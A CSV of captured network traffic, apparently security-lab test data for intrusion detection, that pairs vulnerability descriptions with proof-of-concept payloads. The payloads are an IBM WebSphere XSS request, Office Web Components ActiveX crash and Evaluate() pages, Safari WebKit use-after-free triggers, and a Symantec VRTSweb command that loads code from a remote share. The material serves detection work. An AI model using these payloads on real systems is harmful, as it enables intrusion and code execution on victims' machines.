XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20090331-08_IBM_WebSphere_Application_Server_Cross_Site_Scripting.xml,IBM WebSphere Application Server Cross Site Scripting,"A cross-site scripting vulnerability exists in IBM WebSphere Application Server (WAS). The flaw is due to lack of validation of the user supplied input data. The flaw may be exploited by malicious users to execute arbitrary HTML and script code on target user's web browser, within the context of a trusted web site. An attack targeting this vulnerability can result in the injection and execution of script code. If code execution is successful, the behaviour of the target will depend on the intention of the attacker. Unsuccessful attack attempts could either be unnoticed by the target user, or cause incorrect rendering of the affected web pages.",HTTP/HTTPS,TCP,"GET /ibm/console/<script>alert('Assurent%20Secure%20Technologies,%20a%20Telus%20Company')</script>.jsp HTTP/1.1||0D 0A ||Accept||3A || */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||UA-CPU||3A || x86||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.2||3B || SV1||3B || .NET CLR 1.1.4322)||0D 0A ||Host||3A || dhcp54||3A ||9060||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Cookie||3A || JSESSIONID=0000WsNDJjWnHaPp5ivIVIwC-aH||3A ||-1||0D 0A 0D 0A||"
FSC20090331-08_IBM_WebSphere_Application_Server_Cross_Site_Scripting.xml,IBM WebSphere Application Server Cross Site Scripting,"A cross-site scripting vulnerability exists in IBM WebSphere Application Server (WAS). The flaw is due to lack of validation of the user supplied input data. The flaw may be exploited by malicious users to execute arbitrary HTML and script code on target user's web browser, within the context of a trusted web site. An attack targeting this vulnerability can result in the injection and execution of script code. If code execution is successful, the behaviour of the target will depend on the intention of the attacker. Unsuccessful attack attempts could either be unnoticed by the target user, or cause incorrect rendering of the affected web pages.",HTTP/HTTPS,TCP,"HTTP/1.1 404 Not Found||0D 0A ||Content-Type||3A || text/html||3B ||charset=ISO-8859-1||0D 0A ||$WSEP||3A || ||0D 0A ||Content-Language||3A || en-US||0D 0A ||Transfer-Encoding||3A || chunked||0D 0A ||Connection||3A || Close||0D 0A ||Date||3A || Mon, 06 Apr 2009 18||3A ||36||3A ||21 GMT||0D 0A ||Server||3A || WebSphere Application Server/6.1||0D 0A 0D 0A ||21e5||0D 0A ||<H1>Error page exception</H1>||0A ||<H4>The server cannot use the error page specified for your application to handle the Original Exception printed below.  Please see the Error Page Exception below for a description of the problem with the specified error page.</H4>||0D 0A ||<BR><H3>Original Exception||3A || </H3>||0D 0A ||<B>Error Message||3A || </B>SRVE0200E||3A || Servlet [_ibmjsp._3C_script_3E_alert_28__27_Assurent_20_Secure_20_Technologies_2C__20_a_20_Telus_20_Company_27__29__3C_._script_3E_]||3A || Could not find required class - _ibmjsp._3C_script_3E_alert_28__27_Assurent_20_Secure_20_Technologies_2C__20_a_20_Telus_20_Company_27__29__3C_._script_3E_<BR>||0D 0A ||<B>Error Code||3A || </B>404<BR>||0D 0A ||<B>Target Servlet||3A || </B>/<script>alert('Assurent Secure Technologies, a Telus Company')</script>.jsp<BR>||0D 0A ||<B>Error Stack||3A || </B><BR>||0D 0A ||javax.servlet.UnavailableException||3A || SRVE0200E||3A || Servlet [_ibmjsp._3C_script_3E_alert_28__27_Assurent_20_Secure_20_Technologies_2C__20_a_20_Telus_20_Company_27__29__3C_._script_3E_]||3A || Could not find required class - _ibmjsp._3C_script_3E_alert_28__27_Assurent_20_Secure_20_Technologies_2C__20_a_20_Telus_20_Company_27__29__3C_._script_3E_||0D 0D 0A ||<BR>&nbsp||3B ||&nbsp||3B ||&nbsp||3B ||&nbsp||3B 0D 0A 09 ||at com.ibm.ws.webcontainer.servlet.ServletWrapper.handleRequest&#40||3B ||Ser"
﻿FSC20090713-01_Microsoft_Office_Web_Components_Arbitrary_Code_Execution.xml,Microsoft Office Web Components Arbitrary Code Execution,"A code execution vulnerability exists in Microsoft Office Web Components. The vulnerability is due to insecure design of the Evaluate() method in ActiveX controls. A remote attacker can exploit this vulnerability by enticing a user to visit a malicious web page. In an attack scenario, where arbitrary code is injected and executed on the target system, the behaviour of the target is dependent on the intention of the malicious code. The injected code will be run with privileges of the currently logged on user.",HTTP/HTTPS/POP3/IMAP/SMTP,TCP,"GET /~gwhittington/poc.html HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1||3B || SV1)||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20090713-01_Microsoft_Office_Web_Components_Arbitrary_Code_Execution.xml,Microsoft Office Web Components Arbitrary Code Execution,"A code execution vulnerability exists in Microsoft Office Web Components. The vulnerability is due to insecure design of the Evaluate() method in ActiveX controls. A remote attacker can exploit this vulnerability by enticing a user to visit a malicious web page. In an attack scenario, where arbitrary code is injected and executed on the target system, the behaviour of the target is dependent on the intention of the malicious code. The injected code will be run with privileges of the currently logged on user.",HTTP/HTTPS/POP3/IMAP/SMTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Mon, 13 Jul 2009 18||3A ||32||3A ||32 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8||0D 0A ||Last-Modified||3A || Mon, 13 Jul 2009 18||3A ||32||3A ||04 GMT||0D 0A ||ETag||3A || ||22 ||437004d-14f-46e9a89dfb100||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 335||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0D 0A ||<body>||0D 0A ||<br>Copyright TELUS Security Labs, All Rights Reserved.<br><br>||0D 0A 0D 0A ||<object id=||22 ||ctrl||22 || WIDTH=0 HEIGHT=0 CLASSID=||22 ||CLSID||3A ||0002E551-0000-0000-C000-000000000046||22 ||> </object>||0D 0A 0D 0A ||<script language=Javascript>||0D 0A 0D 0A ||arr = new Array()||3B 0D 0A ||arr.push(document)||3B ||   ||0D 0A || ||0D 0A ||ctrl.Evaluate(arr[0])||3B 0D 0A ||alert(arr)||3B || ||0D 0A 0D 0A ||</script>||0D 0A 0D 0A ||</body>||0D 0A ||</html>||0D 0A||"
﻿FSC20090811-15_Microsoft_Office_Web_Components_Remote_Code_Execution.xml,Microsoft Office Web Components Remote Code Execution,"A memory corruption vulnerability exists in Microsoft Office Web Components ActiveX control. The vulnerability can be triggered when the ActiveX control is instantiated and released multiple times in Internet Explorer. A remote attacker can exploit this vulnerability by enticing a target user to open a maliciously crafted web page. Successful attacks could allow for arbitrary code being injected and executed with privileges of the currently logged on user. If code execution is successful, the behaviour of the target will depend on the intention of the attacker. In case of an unsuccessful code execution attack, the vulnerable application may terminate abnormally on the target host.",HTTP/HTTPS/POP3/IMAP/SMTP,TCP,"GET /~jxia/poc.html HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1||3B || SV1||3B || .NET CLR 2.0.50727||3B || .NET CLR 3.0.4506.2152||3B || .NET CLR 3.5.30729)||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20090811-15_Microsoft_Office_Web_Components_Remote_Code_Execution.xml,Microsoft Office Web Components Remote Code Execution,"A memory corruption vulnerability exists in Microsoft Office Web Components ActiveX control. The vulnerability can be triggered when the ActiveX control is instantiated and released multiple times in Internet Explorer. A remote attacker can exploit this vulnerability by enticing a target user to open a maliciously crafted web page. Successful attacks could allow for arbitrary code being injected and executed with privileges of the currently logged on user. If code execution is successful, the behaviour of the target will depend on the intention of the attacker. In case of an unsuccessful code execution attack, the vulnerable application may terminate abnormally on the target host.",HTTP/HTTPS/POP3/IMAP/SMTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Mon, 24 Aug 2009 23||3A ||00||3A ||01 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8||0D 0A ||Last-Modified||3A || Mon, 24 Aug 2009 22||3A ||56||3A ||18 GMT||0D 0A ||ETag||3A || ||22 ||38b8a46-160-471eb202e4880||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 352||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0D 0A ||<head><title>Proof-of-Concept (PoC) - Copyright TELUS Security Labs, All Rights Reserved</title>||0D 0A ||</head>||0D 0A ||<body>||0D 0A ||<p id=||22 ||para||22 ||></p>||0D 0A 0D 0A ||<script> ||0D 0A ||function crash() {||0D 0A ||    para.innerHTML = '<object classid=||22 ||CLSID||3A ||0002E553-0000-0000-C000-000000000046||22 || id=||22 ||obj||22 ||/>'||3B 0D 0A ||    window.setTimeout(crash, 0)||3B 0D 0A ||} ||0D 0A ||crash()||3B 0D 0A ||</script>||0D 0A 0D 0A ||</body>||0D 0A ||</html> ||0D 0A||"
﻿FSC20090811-18_Microsoft_Office_Web_Components_Heap_Corruption.xml,Microsoft Office Web Components Heap Corruption,"A heap corruption vulnerability exists in Microsoft Office Web Components ActiveX Control that can allow remote attackers to inject and execute arbitrary code on a target system. The vulnerability is due to an implementation error when executing methods on an invalidated object. A remote attacker can exploit this vulnerability by enticing a target user to open a maliciously crafted web page. Successful attacks could allow for arbitrary code being injected and executed with privileges of the currently logged on user. If code execution is successful, the behaviour of the target will depend on the intention of the attacker. In the case of an unsuccessful code execution attack, it could cause the vulnerable application terminate abnormally on the target host.",HTTP/HTTPS/POP3/IMAP/SMTP,TCP,"GET /~gwhittington/poc.html HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1||3B || SV1||3B || .NET CLR 2.0.50727||3B || .NET CLR 3.0.4506.2152||3B || .NET CLR 3.5.30729)||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20090811-18_Microsoft_Office_Web_Components_Heap_Corruption.xml,Microsoft Office Web Components Heap Corruption,"A heap corruption vulnerability exists in Microsoft Office Web Components ActiveX Control that can allow remote attackers to inject and execute arbitrary code on a target system. The vulnerability is due to an implementation error when executing methods on an invalidated object. A remote attacker can exploit this vulnerability by enticing a target user to open a maliciously crafted web page. Successful attacks could allow for arbitrary code being injected and executed with privileges of the currently logged on user. If code execution is successful, the behaviour of the target will depend on the intention of the attacker. In the case of an unsuccessful code execution attack, it could cause the vulnerable application terminate abnormally on the target host.",HTTP/HTTPS/POP3/IMAP/SMTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Wed, 19 Aug 2009 15||3A ||44||3A ||16 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8||0D 0A ||Last-Modified||3A || Wed, 19 Aug 2009 01||3A ||13||3A ||22 GMT||0D 0A ||ETag||3A || ||22 ||437004d-337-4717457525080||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 823||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0D 0A ||<head><title>Proof-of-Concept (PoC) - Copyright TELUS Security Labs, All Rights Reserved</title>||0D 0A ||</head>||0D 0A ||<body>||0D 0A 0D 0A 09 ||<object id=||22 ||ctrl||22 || classid=||22 ||clsid||3A ||{0002E541-0000-0000-C000-000000000046}||22 || ></object> ||0D 0A 0D 0A 09 ||<script> ||0D 0A || ||0D 0A 09 09 ||function boom() { ||0D 0A 0D 0A 09 09 09 ||// keep a reference||0D 0A 09 09 09 ||var arr = new Array()||3B 0D 0A ||                  arr[0]= ctrl.Worksheets(||22 ||Sheet1||22 ||).Range(||22 ||A1||22 ||)||3B 0D 0A || ||0D 0A 09 09 09 ||// assign improperly formatted HTML data string||0D 0A 09 09 09 ||try {||0D 0A 09 09 09 ||      var attack = ||22 ||AAAAAAAAAAAAAAA||22 3B 0D 0A 0D 0A 09 09 09 ||      while (attack.length <= 2048){||0D 0A 09 09 09 09 09 ||attack += attack||3B 0D 0A 09 09 09 ||      }||0D 0A 09 09 09 09 ||ctrl.HTMLData = attack||3B 0D 0A || ||09 09 09 ||} catch(e) {}||3B 0D 0A 0D 0A 09 09 09 ||// invoke method on saved reference with invalid input||0D 0A 09 09 09 ||try {||0D 0A 09 09 09 09 ||arr[0].BorderAround(0xABCD, 0xDEF0, 0x1234, 0x9876)||3B || ||0D 0A 09 09 09 ||} ||0D 0A 09 09 09 ||catch(e) {}||3B || ||0D 0A || ||0D 0A 09 09 ||} ||0D 0A ||            boom()||3B 0D 0A 09 ||</script>||0D 0A 0D 0A ||</body>||0D 0A ||</html> ||0D 0A||"
﻿FSC20091210-01_Symantec_Multiple_Products_VRTSweb_Code_Execution.xml,Symantec Multiple Products VRTSweb Code Execution,A code execution vulnerability has been reported in multiple Symantec products that embed the VERITAS Web Server (VRTSweb) component. The flaw is due to a design weakness when processing requests sent to a target host on port TCP/14300. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted request to the target server. Successful exploitation could result in execution of arbitrary code within the security context of the SYSTEM user. The behaviour of the target is dependent on the intention of the malicious code.,Symantec Veritas Proprietary Admin Protocol,TCP,<Command command=||22 ||startWebApp||22 || authFile=||22 ||.heartbeat||22 || appName=||22 ||poc||22 || installDir=||22 ||\\172.16.1.12\vm-tmp\gwhittington||22 ||/>||0D 03||
FSC20091210-01_Symantec_Multiple_Products_VRTSweb_Code_Execution.xml,Symantec Multiple Products VRTSweb Code Execution,A code execution vulnerability has been reported in multiple Symantec products that embed the VERITAS Web Server (VRTSweb) component. The flaw is due to a design weakness when processing requests sent to a target host on port TCP/14300. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted request to the target server. Successful exploitation could result in execution of arbitrary code within the security context of the SYSTEM user. The behaviour of the target is dependent on the intention of the malicious code.,Symantec Veritas Proprietary Admin Protocol,TCP,<?xml version=||22 ||1.0||22 || encoding=||22 ||UTF-8||22 ||?>||0D 0A ||<CommandReturn success=||22 ||true||22 ||><Messages><Message>Web Application ||22 ||poc||22 || started successfully</Message></Messages></CommandReturn>||0D 0A||
﻿FSC20100615-12_Apple_Safari_Webkit_Option_Element_ContentEditable_Code_Execution.xml,Apple Safari Webkit Option Element ContentEditable Code Execution,"A vulnerability has been reported in Apple Safari's Webkit that could allow remote attackers to execute arbitrary code on a vulnerable system. The vulnerability is due to the way the vulnerable application removes a particular container element containing another element holding the contentEditable attribute. Remote attackers could exploit this vulnerability by enticing the target user to open a maliciously crafted web page.

Successful exploitation could result in execution of arbitrary code within the security context of the current user. An unsuccessful attempt will terminate the affected application abnormally.",HTTP,TCP,"GET /~jxia/poc.html HTTP/1.1||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows||3B || U||3B || Windows NT 5.1||3B || en-US) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7||0D 0A ||Accept||3A || application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Language||3A || en-US||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||If-Modified-Since||3A || Fri, 25 Jun 2010 17||3A ||34||3A ||09 GMT||0D 0A ||If-None-Match||3A || ||22 ||38b8b32-1b5-489de2dae8640||22 0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
FSC20100615-12_Apple_Safari_Webkit_Option_Element_ContentEditable_Code_Execution.xml,Apple Safari Webkit Option Element ContentEditable Code Execution,"A vulnerability has been reported in Apple Safari's Webkit that could allow remote attackers to execute arbitrary code on a vulnerable system. The vulnerability is due to the way the vulnerable application removes a particular container element containing another element holding the contentEditable attribute. Remote attackers could exploit this vulnerability by enticing the target user to open a maliciously crafted web page.

Successful exploitation could result in execution of arbitrary code within the security context of the current user. An unsuccessful attempt will terminate the affected application abnormally.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Fri, 25 Jun 2010 17||3A ||53||3A ||27 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8||0D 0A ||Last-Modified||3A || Fri, 25 Jun 2010 17||3A ||34||3A ||51 GMT||0D 0A ||ETag||3A || ||22 ||38b8b32-1b5-489de302f64c0||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 437||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0A ||<title>Proof of Concept Exploit</title>||0A ||<head>Copyright TELUS Security Labs. All Rights Reserved.||0A 0A ||<script language=||22 ||JavaScript||22 ||>||0A ||function poc()||0A ||{||0A ||    var object = document.getElementById(||22 ||object||22 ||)||3B 0A ||    object.appendChild(document.createElement(||22 ||link||22 ||))||3B 0A ||    object.offsetTop||3B 0A ||    object.innerHTML = ||22 22 3B 0A ||    object.value||3B 0A ||}||0A ||</script>||0A ||</head>||0A ||<body onload=poc()>||0A ||<select id=||22 ||object||22 ||><option>Telus</option></select>||0A ||</body>||0A ||</html>||0A||"
﻿FSC20100615-13_Apple_Safari_Webkit_Attribute_Child_Removal_Code_Execution.xml,Apple Safari Webkit Attribute Child Removal Code Execution,"A vulnerability has been reported in Apple Safari's Webkit that could allow remote attackers to execute arbitrary code on a vulnerable system. The vulnerability is due to the vulnerable application's process for destructing attribute objects via the removeChild method. Remote attackers could exploit this vulnerability by enticing the target user to open a maliciously crafted web page.

Successful exploitation could result in execution of arbitrary code within the security context of the current user. An unsuccessful attempt will terminate the affected application abnormally.",HTTP/HTTPS,TCP,"GET /~jxia/poc.html HTTP/1.1||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows||3B || U||3B || Windows NT 5.1||3B || en-US) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||Accept||3A || application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Language||3A || en-US||0D 0A ||Cache-Control||3A || max-age=0||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
FSC20100615-13_Apple_Safari_Webkit_Attribute_Child_Removal_Code_Execution.xml,Apple Safari Webkit Attribute Child Removal Code Execution,"A vulnerability has been reported in Apple Safari's Webkit that could allow remote attackers to execute arbitrary code on a vulnerable system. The vulnerability is due to the vulnerable application's process for destructing attribute objects via the removeChild method. Remote attackers could exploit this vulnerability by enticing the target user to open a maliciously crafted web page.

Successful exploitation could result in execution of arbitrary code within the security context of the current user. An unsuccessful attempt will terminate the affected application abnormally.",HTTP/HTTPS,TCP,"GET /favicon.ico HTTP/1.1||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows||3B || U||3B || Windows NT 5.1||3B || en-US) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||Referer||3A || http||3A ||//172.16.1.2/~jxia/poc.html||0D 0A ||Accept||3A || */*||0D 0A ||Accept-Language||3A || en-US||0D 0A ||Cache-Control||3A || max-age=0||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
FSC20100615-13_Apple_Safari_Webkit_Attribute_Child_Removal_Code_Execution.xml,Apple Safari Webkit Attribute Child Removal Code Execution,"A vulnerability has been reported in Apple Safari's Webkit that could allow remote attackers to execute arbitrary code on a vulnerable system. The vulnerability is due to the vulnerable application's process for destructing attribute objects via the removeChild method. Remote attackers could exploit this vulnerability by enticing the target user to open a maliciously crafted web page.

Successful exploitation could result in execution of arbitrary code within the security context of the current user. An unsuccessful attempt will terminate the affected application abnormally.",HTTP/HTTPS,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Wed, 23 Jun 2010 20||3A ||04||3A ||31 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8||0D 0A ||Last-Modified||3A || Wed, 23 Jun 2010 20||3A ||04||3A ||19 GMT||0D 0A ||ETag||3A || ||22 ||38b8b31-21a-489b80b0976c0||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 538||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0A ||<title>Proof of Concept Exploit</title>||0A ||<head>Copyright TELUS Security Labs. All Rights Reserved.||0A 0A ||<script language=||22 ||JavaScript||22 ||>||0A ||function poc()||0A ||{||0A ||    var id = document.getElementById(||22 ||t||22 ||)||3B 0A ||    var attribute = id.getAttributeNode('id')||3B 0A ||    nodes = attribute.childNodes||3B 0A ||    document.body.removeChild(id)||3B 0A ||    attribute.removeChild(nodes[0])||3B 0A ||    setTimeout(function() { for (var i = 0||3B || i < 30000||3B || i++) {var s = new String(||22 ||AAA||22 ||)||3B || }||3B || nodes[0].textContent }, 0)||3B 0A ||}||0A ||</script>||0A ||</head>||0A ||<body onload=poc()>||0A ||<p id=t></p>||0A ||</body>||0A ||</html>||0A||"
FSC20100615-13_Apple_Safari_Webkit_Attribute_Child_Removal_Code_Execution.xml,Apple Safari Webkit Attribute Child Removal Code Execution,"A vulnerability has been reported in Apple Safari's Webkit that could allow remote attackers to execute arbitrary code on a vulnerable system. The vulnerability is due to the vulnerable application's process for destructing attribute objects via the removeChild method. Remote attackers could exploit this vulnerability by enticing the target user to open a maliciously crafted web page.

Successful exploitation could result in execution of arbitrary code within the security context of the current user. An unsuccessful attempt will terminate the affected application abnormally.",HTTP/HTTPS,TCP,||00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00||
﻿FSC20100811-05_Apple_Safari_Webkit_Button_First-Letter_Style_Rendering_Code_Execution.xml,Apple Safari Webkit Button First-Letter Style Rendering Code Execution,"A code execution vulnerability exists in Apple Safari's Webkit. The vulnerability is due to a use after free error when
processing 'first-letter' CSS style. This vulnerability may be exploited by remote attackers to execute arbitrary code
on a target system by enticing a user to open a maliciously crafted file.
In situations where code execution is successful the injected code will run within the security context of the currently
logged in user. When code execution fails, the affected product may terminate abnormally.","HTTP,HTTPS",TCP,"GET /~jxia/poc.html HTTP/1.1||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows||3B || U||3B || Windows NT 5.1||3B || en-US) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7||0D 0A ||Accept||3A || application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Language||3A || en-US||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
FSC20100811-05_Apple_Safari_Webkit_Button_First-Letter_Style_Rendering_Code_Execution.xml,Apple Safari Webkit Button First-Letter Style Rendering Code Execution,"A code execution vulnerability exists in Apple Safari's Webkit. The vulnerability is due to a use after free error when
processing 'first-letter' CSS style. This vulnerability may be exploited by remote attackers to execute arbitrary code
on a target system by enticing a user to open a maliciously crafted file.
In situations where code execution is successful the injected code will run within the security context of the currently
logged in user. When code execution fails, the affected product may terminate abnormally.","HTTP,HTTPS",TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 24 Aug 2010 14||3A ||08||3A ||07 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8||0D 0A ||Last-Modified||3A || Tue, 24 Aug 2010 14||3A ||06||3A ||58 GMT||0D 0A ||ETag||3A || ||22 ||38b8b87-114-48e9247370480||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 276||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0A ||<head>||0A ||<style>||0A ||    .first||3A ||first-letter {||0A ||        font-size||3A ||xx-large||3B 0A ||    }||0A ||    .second {||0A ||        display||3A || block||3B 0A ||    }||0A ||</style>||0A ||</head>||0A ||<body class=||22 ||first||22 ||>||0A ||    <input class=||22 ||second||22 || type=||22 ||submit||22 ||/>||0A ||    TELUS Security Labs Proof Of Concept||0A ||    <style/>||0A ||</body>||0A ||</html>||0A||"
